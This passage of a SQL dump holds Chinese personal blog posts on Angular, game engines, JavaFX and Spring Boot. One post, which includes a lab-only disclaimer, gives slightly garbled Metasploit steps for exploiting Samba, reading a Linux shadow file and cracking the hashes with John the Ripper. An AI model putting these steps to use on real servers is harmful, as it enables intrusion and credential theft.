添加页面的访问路径\r\n在app.module.ts文件引入**RouterModule, Routes**两个mudule\r\n\r\n```typescript\r\nimport { RouterModule, Routes} from \'@angular/router\';\r\n```\r\n## 4.发布你的网页\r\n如果你想在线的发布你的网页，可以使用以下指令。也可以借助GitHub平台，免费的发布在线网站(首先你需要将你的本地的项目push到你的GitHub账号，之后借助github做简单的配置即可，本人在学习的时候测试过)\r\n```\r\n> ng build --prod --base-href=\"myurl\"\r\n```\r\n## 5.页面的源代码\r\napp.module.ts文件：\r\n```typescript\r\nimport { BrowserModule } from \'@angular/platform-browser\';\r\nimport { NgModule } from \'@angular/core\';\r\n// -------------import modules ------------------\r\nimport { FormsModule } from \'@angular/forms\';\r\nimport { HttpModule } from \'@angular/http\'; // fetch json form API\r\nimport { RouterModule, Routes} from \'@angular/router\'; // change web page\r\nimport { AppComponent } from \'./app.component\';\r\nimport { UserComponent } from \'./components/user/user.component\';\r\nimport { DataService } from \'./services/data.service\';\r\nimport { AboutComponent } from \'./components/about/about.component\';\r\nimport { LoginComponent } from \'./component/login/login.component\';  \r\n// Use this in the appComponent:  <router-outlet></router-outlet> \r\nconst appRoutes: Routes = [\r\n  {path: \'\', component: UserComponent},  // /\r\n  {path: \'about\', component: AboutComponent}, // /about\r\n  {path: \'login\', component: LoginComponent} // /login\r\n]\r\n// Rememer add the import Module\r\n@NgModule({\r\n  declarations: [\r\n    AppComponent,\r\n    UserComponent,\r\n    AboutComponent,\r\n    LoginComponent \r\n  ],\r\n  imports: [\r\n    BrowserModule,\r\n    FormsModule,\r\n    HttpModule,\r\n    RouterModule.forRoot(appRoutes)\r\n  ],\r\n  providers: [DataService],\r\n  bootstrap: [AppComponent]\r\n})\r\nexport class AppModule { \r\n}\r\n```\r\ndata.service.ts文件：\r\n```typescript\r\nimport { Injectable } from \'@angular/core\';\r\nimport { Http } from \'@angular/http\';\r\nimport \'rxjs/add/operator/map\'; \r\n@Injectable()\r\nexport class DataService {\r\n  constructor(public http: Http) { \r\n    console.log(\'data service connected....\');\r\n  }\r\n  getPosts(){ \r\n    return this.http.get(\'https://jsonplaceholder.typicode.com/posts\').map(res => res.json()); \r\n  }\r\n}\r\n```\r\nuser.component.html文件：\r\n```html\r\n<h1>{{name}}</h1>\r\n<ul>\r\n  <li> age: {{age }} </li>\r\n  <li> email: {{email}} </li>\r\n  <li> address : {{address.street}} - {{address.city}} - {{address.state}} </li>\r\n</ul>\r\n<button (click) = \"onClick()\">Click Me</button>\r\n<button (click) = \"toggleEditUser()\">Edit User</button>\r\n<div *ngIf=istoggleEditUser>\r\n  <h1>Edit user</h1>\r\n  <form>\r\n    <div>\r\n      <label for=\"name\">Name : </label> <br> \r\n	  <input type=\"text\" [(ngModel)]=\"name\" name=\"name\">\r\n    </div>\r\n    <div>\r\n      <label for=\"age\">Age : </label> <br>\r\n      <input type=\"number\" [(ngModel)]=\"age\" name=\"age\">\r\n    </div>\r\n    <div>\r\n      <label for=\"email\">Email : </label> <br>\r\n      <input type=\"text\" [(ngModel)]=\"email\" name=\"email\">\r\n    </div>\r\n    <div>\r\n      <label for=\"street\">Street : </label> <br>\r\n      <input type=\"text\" [(ngModel)]=\"address.street\" name=\"street\">\r\n    </div>\r\n    <div>\r\n      <label for=\"city\">City : </label> <br>\r\n      <input type=\"text\" [(ngModel)]=\"address.city\" name=\"city\">\r\n    </div>\r\n    <div>\r\n      <label for=\"state\">State : </label> <br>\r\n      <input type=\"text\" [(ngModel)]=\"address.state\" name=\"state\">\r\n    </div>\r\n  </form>\r\n</div>\r\n<h1>Hobbies</h1>\r\n<form (submit)=\"addHobby(hobby.value)\">\r\n  <div>\r\n    <label for=\"hobby\"> Hobby </label>\r\n    <input type=\"text\" #hobby>\r\n  </div>\r\n</form>\r\n<ul>\r\n  <li *ngFor = \"let hobby of hobbies; let id = index\"> {{id+1}} : {{hobby}} \r\n    <button (click) = \"deleteHobby(hobby)\"> X </button>\r\n  </li>\r\n</ul>\r\n<h1>Posts</h1>\r\n<h3>The number of posts :{{lengthHobbies}}</h3>\r\n<div *ngFor = \"let post of posts\">\r\n  <h4>{{post.title}}</h4>\r\n  <p>{{post.body}}</p>\r\n</div>\r\n```\r\nuser.component.ts文件：\r\n```typescript\r\nimport { Component, OnInit } from \'@angular/core\';\r\nimport { DataService } from \'../../services/data.service\';\r\nimport { post } from \'selenium-webdriver/http\';\r\n\r\n@Component({\r\n  selector: \'app-user\',\r\n  templateUrl: \'./user.component.html\',\r\n  styleUrls: [\'./user.component.css\']\r\n})\r\nexport class UserComponent implements OnInit {\r\n  name: string;\r\n  age: number;\r\n  email: string;\r\n  address: Address;\r\n  hobbies: string[]; // set any[] to any type of the variable \r\n  lengthHobbies : number; // It can only be used in this file !!!\r\n  test: any;\r\n  posts: Post[] ;\r\n  istoggleEditUser: boolean = false;\r\n  // Then: use any fontions in the DataServices\r\n  constructor(private dataservice : DataService) {\r\n    console.log(\'constructor ran...\');\r\n   }\r\n  ngOnInit() {\r\n    console.log(\'ngOnInit ran...\')\r\n    this.name = \'chen tong\';\r\n    this.age = 23;\r\n    this.email = \"test@ibm.com\";\r\n    this.address = {\r\n      street: \'paris\',\r\n      city: \'paris\',\r\n      state: \'paris rue de la france\'\r\n    }\r\n    this.hobbies = [\'greet\', \'hello\', \'good night\'];\r\n    this.lengthHobbies = this.hobbies.length;\r\n    this.test = \'anything to this variable\';\r\n    this.dataservice.getPosts().subscribe((posts) => {\r\n      this.posts = posts;\r\n    });\r\n  }\r\n  // Create the event fonction : addHobby with a parametre\r\n  addHobby(hobby){\r\n      console.log(hobby);\r\n      this.hobbies.unshift(hobby); \r\n      return false;\r\n  }\r\n  // Create the fonction to delete a hobby in the list\r\n  deleteHobby(hobby){\r\n    console.log(hobby);\r\n    for(let i = 0; i < this.hobbies.length; i++){\r\n      if(this.hobbies[i] == hobby){\r\n         this.hobbies.splice(i, 1); // delete one of the thing\r\n      }\r\n    }\r\n  }\r\n  // This fonction decide whether to edit user\r\n  toggleEditUser(){\r\n    this.istoggleEditUser = !this.istoggleEditUser;\r\n  }\r\n}\r\n\r\n// create an interface to the objet Address\r\n// put this interface in the end of this file\r\ninterface Address { street: string, city: string, state: string }\r\ninterface Post { id: number, title:string, body: string, userID: number  }\r\n```\r\n\r\n# Angular 总结提高\r\nAngular的强大之处在于你可以非常容易的控制界面的元素，将页面的内容用变量的方式来替代，从而实现页面内容的实时加载和实时的刷新，而不需要去刷新整个页面的链接(当然，使用AJAX搭配jQuery也能做到网页的部分刷新)。\r\n\r\n这一点你可以从上面的源码可以看到: user.component.ts 对 user.component.html前端界面显示内容的控制，可以说是非常的灵活，只要你有一点编程的基础就很容易上手。\r\n\r\n对应Angular更多的功能，你可以在网上查询资料学习，有问题欢迎在博客下面留言。',
        '2018-11-26 22:23:41', '/images/blog5.jpg', '原创', , , , 'Angular Web前端极速开发', '2018-11-29 23:16:01', 7, 55, 1,
        'Angular作为AngularJS后几代新版本的名称，是目前最为流行的Web前端框架之一。它让开发网页变得异常的轻松自如，省去了很繁琐的JS函数代码的实现，能在短时间内做出绚丽的界面', 0);
INSERT INTO `t_blog`
VALUES (86, , ,
        '> **在此声明：可以搭建虚拟Linux服务器进行测试使用。如果对外使用，后果将全部由你承担。**\r\n\r\n这篇博客主要介绍以下3个方面的内容：\r\n1. 密码的加密方式\r\n2. 渗透测试\r\n3. 密码的破解\r\n\r\n# 密码的加密方式\r\n目前使用的加密方式有以下的6种，分成3种类型的加密方式，具体每一种加密方式可以网上查询。\r\n\r\n哈希加密 | 对称加密 | 非对称加密\r\n------ | ------- | ---------\r\nMD5 | 3-DES | RSA\r\nSHA-1 | AES | DH\r\n\r\n简单的说，加密就是将原来简单的密码通过特殊运算(通常含密码锁secret)，生成复杂的难以被破解的密码字符串。\r\n\r\n下面给出一种使用java对字符串进行加密的简单算法：\r\n```java\r\n// 传入要加密的值value和密码锁secret\r\npublic static String encryptAndUncrypt(String value, char secret){\r\n	byte[] bt = value.getBytes();\r\n	for(int i=0; i<bt.length; i++){\r\n		bt[i] = (byte)(bt[i]^(int)secret);\r\n	}\r\n	// 返回加密后的字符串\r\n	return new String(bt, 0, bt.length);\r\n}\r\n```\r\n\r\n下面是java的**MD5**加密算法：\r\n```java\r\npublic static String code(String str){\r\n	try {\r\n		MessageDigest md = MessageDigest.getInstance(\"MD5\");\r\n		md.update(str.getBytes());\r\n		byte[] byteDigest = md.digest();\r\n		int i;\r\n		StringBuffer buffer = new StringBuffer(\"\");\r\n		for(int offset=0; offset < byteDigest.length; offset++){\r\n			i = byteDigest[offset];\r\n			if(i<0)\r\n				i += 256;\r\n			if(i<16)\r\n				buffer.append(\"0\");\r\n			buffer.append(Integer.toHexString(i));\r\n		}\r\n		return buffer.toString(); // 32 bits 加密   \r\n	} catch (NoSuchAlgorithmException e) {\r\n		e.printStackTrace();\r\n		return null;\r\n	}\r\n}\r\n```\r\n\r\n# 渗透测试\r\n首先简单的介绍一下什么是渗透测试：\r\n**渗透测试就是通过对目标的分析，从而发现和检测到目标机的漏洞**\r\n- 目标的获取和分析\r\n	介绍一个端口扫描工具：**nmap (Linux下的网络扫描和嗅探工具包)**。它可以扫描一个IP地址，也可以扫描一系列的IP地址，从而检测到每个IP地址对应的主机下的所有端口情况，比如HTTP端口，Telnet端口，LDAP端口，SSH等等。\r\n	\r\n- 漏洞的检测\r\n	首先需要在linux服务器下面安装渗透测试的工具，推荐的使用的 **Kali Linux**。\r\n	Kali 是一个基于 Debian 的 Linux 发行版。它的目标就是为了简单：在一个实用的工具包里尽可能多的包含渗透和审计工具。Kali 实现了这个目标。大多数做**安全测试**的开源工具都被囊括在内。\r\n	\r\n	在Kali Linux通过使用一些特殊的模块来进行测试就变得非常的简单。\r\n	借助Kali上的模块，我们可以进行众多的操作测试 ：\r\n	```bash\r\n    > use module Module_name  // 使用一个模块\r\n    > show options  // 显示模块的选项\r\n    > set RHOSTS @IP\r\n    > set USERNAME root\r\n    > set PASSWORD root\r\n    > run // 运行操作的指令\r\n	```\r\n- 漏洞的优化\r\n 针对端口的漏洞提出一些解决的方案，下面给出例子：\r\n 1. 将http换成https来提高安全性\r\n 2. 将telnet换成ssh\r\n 3. 将LDAP换成LDAPS\r\n \r\n# 密码的破解 \r\n终于到了本篇文章的重点 : ***如何\"优雅\"地破解掉一台Linux服务器的开机密码?***\r\n```bash\r\n// 选择对应的模块，确定要破解的目标主机的IP地址\r\n> use exploit/multi/samba/usemap \r\n> set PLAYLOAD cmd/unix/bind_perl\r\n// 访问到目标机的密码散列\r\n> set CMD \"etc/shadow\"\r\n// 访问到目标机的password和user\r\n> run \r\n// 当获取到信息后，使用John the ripper来破解\r\n> unshadow user password > unshadow\r\n// 执行john指令，即可根据目标机的密码password\r\n> john unshadow\r\n```\r\n有了密码之后可以远程登陆到目标主机，copy到一些数据，同时也可以将目标机的信息显示出来查看，该功能的实现你可以自行探索。',
        '2018-11-26 23:50:17', '/images/blog6.jpg', '原创', , , , '如何破解电脑的开机密码 ?', '2018-11-29 23:11:09', 16, 17, 1,
        '本人是学系统和网络安全专业毕业的，接触到一些的关于信息安全方面的知识。这篇文章我将会介绍课程学到的一门黑客技术：如何破解掉一个Linux服务器的开机密码，从而拿到电脑内的信息\r\n', 3);
INSERT INTO `t_blog`
VALUES (87, , ,
        '------------\r\n###### 如首图所示，是我2年前借助Unity 3D开发的出来的一款3D冒险射击类游戏\r\n------------\r\n*游戏开发作为我一个很小的爱好，其实研究的并不多，有时只是为了做编程测试而想到的开发。*\r\n\r\n下面我将介绍几款非常优秀的游戏制作引擎或者软件：\r\n# 1. Unity 3D\r\n\r\n![Unity 3D](/images/unity.jpg)\r\n\r\nUnity 3D 可以说是游戏开发的神器，非常容易上手，根据**个人的使用情况**总结出以下几个特点：\r\n\r\n- 目前支持的编程语言主要是C#和JS，只需一点点的编程基础就能够掌握，可以参考开发者手册。\r\n\r\n- Unity 3D的主界面功能十分的强大，很多的操作可以直接在界面配置完成，减少了编码的强度。\r\n\r\n- Unity 3D支持多个主流平台的输出，PC端和手机端都没有问题，只需要安装相应的APK包即可。\r\n\r\n- Unity 3D支持AR和VR游戏的开发(关于这一点，我会写一篇博客介绍如何开发AR或者VR游戏)。\r\n\r\n喜欢游戏的朋友可以在网上搜索教程学起来。\r\n\r\n# 2. Cocos & Cocos Creator\r\n\r\n![Cocos](/images/coscos.jpg)\r\n\r\n对于Cocos的了解来源于我在2017年学习C++的时候开发的一款PC端的游戏，当时借助Cocos Creator构建游戏的场景，之后在转入Visual Studio中使用C++开发。由于Cocos集成了很多的库和功能函数，所以开发起来算是比较的容易的，下面是游戏的截图：\r\n\r\n![Cocos Game](/images/coscosgame.jpg)\r\n\r\n总的来将，Cocos在开发2D游戏上面是非常的不错，只不过于游戏的展示设计上面要求高一些，在设计部分，可能需要制作相对较多的游戏素材。\r\n\r\n# 3. RPG Maker XP \r\n\r\n![RPG](/images/rpg.jpg)\r\n\r\n接触到这款游戏开发引擎是源于我在课程上看到同学在使用，于是私下进行了研究。\r\n\r\nRPG Maker XP（RPGXP）是一款可让玩家自行制作在计算机游戏中相当受欢迎的角色扮演游戏，玩家可以自由发挥，设计出一款属于自己的游戏。个人觉得开发起来比较方便的原因有以下几点：\r\n- 含有非常丰富的素材供你使用，可以直接就拖动到你的游戏场景\r\n- 自带了JS的函数库，极大的加快开发的速度\r\n- 环境配置方面做的很不错，例如包含一些背景音乐之类的\r\n\r\n**注意：这款游戏开发引擎是付费的，本人还没有找到破解的方式，但是可以适用一段时间再决定是否合适。**\r\n\r\n\r\n# 4. Unreal engine 游戏引擎 \r\n\r\n![Unreal](/images/unreal.jpg)\r\n\r\nEpic开发的游戏引擎，是目前世界知名授权最广的游戏引擎之一，占有全球商用游戏引擎80%的市场份额。\r\n\r\n目前还没在上面测试过完整的项目，但毫无疑问，这是一款非常顶级的游戏引擎，值得你去学习。\r\n\r\n# 5. Lib GDX\r\n\r\n![Lib GDX](/images/lib.jpg)\r\n\r\n在学习安卓开发的过程中，我接触到这款游戏开发的软件，并借助它成功的开发了一款安卓手机游戏(关于这款游戏的制作，会在接下来的博客中介绍)，并发布到Google Play商店。\r\n\r\n从软件的截图不难发现，这款软件的跨平台性还是非常的强的，支持PC端和手机端平台。同时构建项目也是非常的简单，如果你想做安卓手机游戏，只需提供Android SDK便能够构建你的个人项目，之后使用java开发语言。\r\n\r\n虽然Lib GDX自身带有很多的库函数之类的，但是个人觉得使用的API不是很完善，在查找资料的时候不是很方便。\r\n\r\n',
        '2018-11-27 18:41:49', '/images/blog7.jpg', '原创', , , , '游戏开发引擎介绍', '2018-11-29 23:03:27', 17, 58, 1,
        '这篇博客将会介绍几款我使用过的游戏开发引擎或者软件，如果你也是个游戏开发爱好者，相信这篇文章能够帮助你很好的入门，选择到一款适合自己的开发引擎', 2);
INSERT INTO `t_blog`
VALUES (88, , ,
        '> 在软件开发的过程中，界面的设计是首要的一步。通过软件平台来构建界面而非代码，往往可以极大的提高开发者的效率。\r\n\r\n下面介绍3种方式：\r\n- **Visual C#** 的 **Form Design**窗体\r\n- **Java Swing**窗体\r\n- **JavaFX**窗体软件\r\n\r\n# 1. Visual C Shape\r\n最近学了一个关于使用C#构建桌面软件的项目，发现可以使用**Form Design**窗体来直接进行软件界面的设计，简单的说就是在面板上设置界面的一些元素(按钮，图片，样式信息等等)，之后在程序中来运用这些界面元素。\r\n\r\n这种界面化的设计方式非常类似于Android和iOS界面开发方式。下面是一些界面的属性信息。\r\n\r\n![design](/images/blog8.jpg)\r\n\r\n# 2. Java Swing 窗体\r\nSwing是GUI(图形用户界面)开发工具包，可以方便的开发Java应用程序。相信学过Java编程语言的人应该对Swing并不陌生。使用Swing开发出的窗体的风格会与当前运行平台上的窗体风格一致，同时开发者也可以在跨平台时指定窗口统一的风格与外观。\r\n\r\nSwing中基本元素比较的多，包括一些基本的组件，容器组件和窗体布局等。感兴趣的朋友可以在网上查找关于**Swing窗体设计**的资料或者教程。\r\n\r\n总体而言，在项目测试过之后，个人的感受是发现Swing的使用相比较于含界面化的开发方式显得更为复杂一些，代码编辑的部分比较多，而且直观性没有那么突出。不过还是非常的强大的，值得一试。\r\n\r\n# 3. JavaFX 软件\r\n这款软件能让你通过CUI(图形用户界面)来编辑软件的界面，同时支持使用CSS文件来优化界面的风格样式，完成之后生成fxml在程序中使用即可。JavaFX也提供了很多必要的组件可以满足你的开发需求，如下图所示：\r\n\r\n![JAVA FX](/images/blog8-1.jpg)\r\n\r\n下面介绍一个小的测试项目，做一个软件的登陆界面 ：\r\n## 3.1 生成fxml文件\r\n完成的界面设计如下图：\r\n\r\n![JAVA FX LOGIN](/images/blog8-2.jpg)\r\n\r\n生成对应的fxml文件如下：\r\n```fxml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n\r\n<?import java.net.*?>\r\n<?import javafx.scene.image.*?>\r\n<?import java.lang.*?>\r\n<?import javafx.scene.control.*?>\r\n<?import javafx.scene.layout.*?>\r\n<?import javafx.scene.text.*?>\r\n<?import javafx.scene.control.Button?>\r\n<?import javafx.scene.control.Label?>\r\n<?import javafx.scene.control.PasswordField?>\r\n<?import javafx.scene.control.TextField?>\r\n<?import javafx.scene.layout.AnchorPane?>\r\n<?import javafx.scene.text.Font?>\r\n<?import javafx.scene.text.Text?>\r\n\r\n<AnchorPane id=\"login\" prefHeight=\"486.0\" prefWidth=\"499.0\" stylesheets=\"@../../css/loginStyle.css\" xmlns=\"http://javafx.com/javafx/8\" xmlns:fx=\"http://javafx.com/fxml/1\" fx:controller=\"controller.LoginController\">\r\n   <children>\r\n      <TextField fx:id=\"userName\" layoutX=\"257.0\" layoutY=\"184.0\">\r\n         <font>\r\n            <Font name=\"Futura Medium\" size=\"13.0\" />\r\n         </font></TextField>\r\n      <PasswordField fx:id=\"passWord\" layoutX=\"257.0\" layoutY=\"250.0\">\r\n         <font>\r\n            <Font name=\"Futura Medium\" size=\"13.0\" />\r\n         </font></PasswordField>\r\n      <Text fill=\"#32b282\" layoutX=\"104.0\" layoutY=\"273.0\" strokeType=\"OUTSIDE\" strokeWidth=\"0.0\" text=\"PASSEWORD\">\r\n         <font>\r\n            <Font name=\"Cambria Italic\" size=\"25.0\" />\r\n         </font>\r\n      </Text>\r\n      <ImageView fitHeight=\"70.0\" fitWidth=\"305.0\" layoutX=\"104.0\" layoutY=\"65.0\" pickOnBounds=\"true\" preserveRatio=\"true\">\r\n         <image>\r\n            <Image url=\"@../../images/login_title.PNG\" />\r\n         </image>\r\n      </ImageView>\r\n      <Text fill=\"#78aedd\" layoutX=\"104.0\" layoutY=\"328.0\" strokeType=\"OUTSIDE\" strokeWidth=\"0.0\" text=\"Don\'t have a local account ! \">\r\n         <font>\r\n            <Font size=\"14.0\" />\r\n         </font>\r\n      </Text>\r\n      <Text fill=\"#e14d4d\" layoutX=\"287.0\" layoutY=\"327.0\" strokeType=\"OUTSIDE\" strokeWidth=\"0.0\" text=\"Create one right now\">\r\n         <font>\r\n            <Font size=\"14.0\" />\r\n         </font>\r\n      </Text>\r\n      <Button id=\"login_button\" fx:id=\"loginButton\" layoutX=\"128.0\" layoutY=\"381.0\" mnemonicParsing=\"false\" onAction=\"#LoginAction\" prefHeight=\"29.0\" prefWidth=\"266.0\" stylesheets=\"@../../css/loginStyle.css\" textFill=\"#171717\">\r\n         <font>\r\n            <Font name=\"Comic Sans MS Bold Italic\" size=\"17.0\" />\r\n         </font></Button>\r\n      <Text fill=\"#32b282\" layoutX=\"101.0\" layoutY=\"207.0\" strokeType=\"OUTSIDE\" strokeWidth=\"0.0\" text=\"USERNAME\">\r\n         <font>\r\n            <Font name=\"Cambria Italic\" size=\"25.0\" />\r\n         </font>\r\n      </Text>\r\n   </children>\r\n</AnchorPane>\r\n\r\n```\r\n\r\n## 3.2 设置界面的控制器Controller\r\n对于每一个软件的界面往往都需要设置一个控制器，用于处理页面的逻辑功能。同是必须在fxml文件中绑定相应的控制器Controller ：\r\n```\r\nfx:controller=\"controller.LoginController\"\r\n```\r\n之后在控制器中获取界面的元素，构建执行的函数，实例如下：\r\n```java\r\npublic class LoginController extends RootController{\r\n	@FXML\r\n    private TextField userName;\r\n	@FXML\r\n    private PasswordField passWord;\r\n	@FXML\r\n    private Button loginButton; \r\n  \r\n    public String getUserName(){ return userName.getText(); }\r\n	public String getPassword(){ return passWord.getText(); } \r\n	\r\n	/**\r\n	* 用户登陆时的Button函数，用于验证用户名和密码\r\n	*/\r\n    @FXML\r\n    public void LoginAction(ActionEvent event) throws IOException {\r\n    	boolean check = true;\r\n    	if (userName.getText().length()!=0){\r\n    		// Do something\r\n    	}else{\r\n    		userName.setTooltip(new Tooltip(\"Username cannot be null!\"));\r\n			check = false;\r\n    	}\r\n    	if (passWord.getText().length()!=0){\r\n    		// Do something\r\n    	}else {\r\n		    passWord.setTooltip(new Tooltip(\"Password cannot be null!\"));\r\n			check = false;\r\n		}\r\n    }\r\n }\r\n```\r\n\r\n## 3.3 加载页面\r\n可以在主函数中使用FXMLLoader获取fxml文件，并加载成Pane，随后设置对应的界面的名称方便查询调用。\r\n```java\r\nprivate Pane LoadLoginView() throws IOException{\r\n	FXMLLoader fxmlLoader = new FXMLLoader(getClass().getResource(\"/view/Login.fxml\"));\r\n	Pane login = (Pane) fxmlLoader.load();\r\n	rootControllerMap.put(\"LoginController\", fxmlLoader.getController());\r\n	FXMLViewMap.put(\"LoginView\", login);\r\n	return login;\r\n}\r\n	\r\nprivate void LoadMenuView() throws IOException{\r\n	FXMLLoader fxmlLoader = new FXMLLoader(getClass().getResource(\"/view/Menu.fxml\"));\r\n	Pane menu = (Pane) fxmlLoader.load();\r\n	rootControllerMap.put(\"MenuController\", fxmlLoader.getController());\r\n	FXMLViewMap.put(\"MenuView\", menu);\r\n}\r\n```\r\n\r\n## 3.4 跳转界面\r\n最后就是在完成验证之后界面的跳转问题，首先是获取到要加载的界面，然后使用Stage来加载场景，并show出来即可。\r\n```java\r\n// 如果是验证通过，跳到菜单界面\r\nif (check){\r\n	Stage stage = (Stage) loginButton.getScene().getWindow();\r\n	Pane login = (Pane) main.getViewMap().get(\"MenuView\");\r\n	if (login.getScene() == null) {\r\n		Scene scene = new Scene(login);\r\n		stage.setScene(scene);\r\n	} else {\r\n		cleanValue(login);\r\n		stage.setScene(login.getScene());\r\n	}\r\n	stage.show();\r\n}\r\n```\r\n总结一下，完成以上的步骤之后，你便可以看到运行后的界面。理解之后，便能查询资料自己做开发了。\r\n','2018-11-28 20:00:17','https://picsum.photos/800/450?image=532','原创',,,,'软件开发: 界面设计','2018-11-29 22:55:34',8,56,1,'本文所指的软件是指面向PC端的软件，我会介绍3种开发软件界面的方式：JavaFX, Java Swing 和 Visual C#。 其中一种提供项目源代码展示, 你可以根据开发需求进行选择\r\n',2);
INSERT INTO `t_blog` VALUES (89,,,'# 开发步骤 (精简版)\r\n使用的开发环境：**Visual Studio Code + IDEA 集成开发环境**\r\n\r\n开发思路包括主要包括下面五个步骤 ：\r\n\r\n## 1. 使用需求分析\r\n开发一个可以发布博客和分享编程技术的在线平台。\r\n\r\n## 2. 页面设计\r\n开发的基础界面样式力求简约干净，方便信息的搜索和查询，每个页面含有相同的顶部和底部的设计。\r\n*PS：以上部分可以根据个人的需求设计，使页面更加的美观流畅。*\r\n\r\n## 3. 前端开发\r\n- **Semantic UI**前端框架：该框架包含丰富的界面设计的样式，足够满足开发的需求。\r\n\r\n- 根据设计的页面样式，使用html，Css，JavaScript，jQuery来完成所有的前端界面\r\n\r\n- 集成多种页面的插件 (主要包含如下插件)\r\n	1. 页面的文本编辑器\r\n	2. 页面的动画 \r\n	3. 文本代码的高亮 \r\n	4. 页面工具条 \r\n	5. 滚动的监测 \r\n	6. 屏幕的平滑滚动\r\n	7. 页面目录的生成\r\n	8. 页面二维码的自动生成\r\n\r\n## 4. 后端开发\r\n完成前端界面之后，导入到由maven构建的spring boot项目：\r\n- 选择版本: spring-boot 2.0.5.RELEASE\r\n\r\n- 构建\r\n```\r\n<build>\r\n	<plugins>\r\n		<plugin>\r\n			<groupId>org.springframework.boot</groupId>\r\n			<artifactId>spring-boot-maven-plugin</artifactId>\r\n		</plugin>\r\n	</plugins>\r\n</build>\r\n```\r\n	\r\n- 日志信息的处理\r\n  创建日志信息处理类，并配置xml文件\r\n  \r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\r\n<configuration>\r\n    <include resource=\"org/springframework/boot/logging/logback/defaults.xml\" />\r\n    <property name=\"LOG_FILE\" value=\"${LOG_FILE:-${LoG_FILE:-${LOG_TEMP:-${java.io.tmpdir:-/tmp}}}/spring.log}\" />\r\n    <include resource=\"org/springframework/boot/logging/logback/console-appender.xml\" />\r\n    <appender name=\"TIME_FILE\" class=\"ch.qos.logback.core.rolling.RollingFileAppender\">\r\n        <encoder>\r\n            <pattern>${FILE_LOG_PATTERN}</pattern>\r\n        </encoder>\r\n        <file>${LOG_FILE}</file>\r\n        <rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\">     \r\n            <fileNamePattern>${LOG_FILE}.%d{yyyy-MM-dd}.%i</fileNamePattern>       \r\n            <maxHistory>30</maxHistory>          \r\n            <timeBasedFileNamingAndTriggeringPolicy class=\"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP\">\r\n                <maxFileSize>10MB</maxFileSize>\r\n            </timeBasedFileNamingAndTriggeringPolicy>\r\n        </rollingPolicy>\r\n    </appender>\r\n    <root level=\"INFO\">\r\n        <appender-ref ref=\"CONSOLE\" />\r\n        <appender-ref ref=\"TIME_FILE\" />\r\n    </root>\r\n</configuration>\r\n```\r\n  \r\n- 网页拦截器\r\n  构建网页拦截系统，过滤异常网页的访问。\r\n  \r\n```java\r\npublic class WebConfig implements WebMvcConfigurer {\r\n	@Override\r\n	public void addInterceptors(InterceptorRegistry registry) {\r\n		registry.addInterceptor(new LoginInterceptor())\r\n			.addPathPatterns(\"/admin/**\")\r\n			.excludePathPatterns(\"/admin\")\r\n			.excludePathPatterns(\"/admin/login\");\r\n	}\r\n}\r\n```\r\n\r\n- 页面的模型\r\n   根据界面的内容和功能抽象出模型，建立Model类，每一个类对应数据存储中的一个表格。\r\n\r\n- 数据库的构建\r\n   在本机安装Mysql数据库，用于存储博客以及页面的信息，永久保存。\r\n   \r\n   添加项目的Mysql数据库依赖：\r\n   \r\n```\r\n<dependency>\r\n	<groupId>mysql</groupId>\r\n	<artifactId>mysql-connector-java</artifactId>\r\n	<scope>runtime</scope>\r\n</dependency>\r\n```\r\n\r\n   完成数据库链接：\r\n   \r\n```\r\nspring:\r\n	datasource:\r\n		driver-class-name: com.mysql.jdbc.Driver\r\n		url: jdbc:mysql://localhost:3306/blog?useUnicode=true&characterEncoding=utf-8\r\n		username: admin\r\n		password: admin\r\n	jpa:\r\n		hibernate:\r\n		ddl-auto: update\r\n		show-sql: true\r\n```\r\n\r\n在运行项目的时候，根据Sping Boot中JPA自动构建数据库中的表格\r\n\r\n- 项目的开发模型\r\n\r\n   在**MVC**模型的基础上，使用的**多层次结构 Service + Dao**\r\n	 1. 终端显示层 **Html** ==> 前端页面\r\n	 2. 请求处理层 **Web**  ==> 页面的controller控制器\r\n	 3. 业务逻辑层 **Service** ==> 处理所有的功能服务\r\n	 4. 持久层 **Dao** ==> 数据库操作的层次\r\n\r\n- 后端模板\r\n   1. 采用**thymeleaf**模板引擎，提供丰富的前端界面动态处理信息的功能。\r\n   2. 版本：thymeleaf version 3.0版本 \r\n   3. 添加项目的依赖 ：\r\n   \r\n```\r\n<dependency>\r\n	<groupId>org.springframework.boot</groupId>\r\n	<artifactId>spring-boot-starter-thymeleaf</artifactId>\r\n</dependency>\r\n```\r\n\r\n## 5. 网站发布\r\n- 主机配置**IIS协议** ：实现局域网可以访问网站\r\n\r\n- 将个人电脑设置成外网可以访问的服务器\r\n   1. 申请域名地址 ：可以到域名申请的网站注册\r\n   2. **内网渗透** ： 将自己的网站发布到外网\r\n\r\n**总上所述，是独立开发网站的一个整个框架和思路，对应模型和模板有多种选择，并不唯一。**\r\n\r\n希望你能有所启发，如果有什么疑问，可以在博客下面留言。','2018-11-28 23:22:15','/images/blog9.jpg','原创',,,,'网站架构：开发自己的网站','2018-11-29 22:50:56',20,55,1,'这篇博客我将介绍：这个个人网站是如何做出来的 ? 包括整体的网站构建，项目框架，技术的选择以及如何发布网站等等      ',0);
INSERT INTO `t_blog`
VALUES (92, , ,
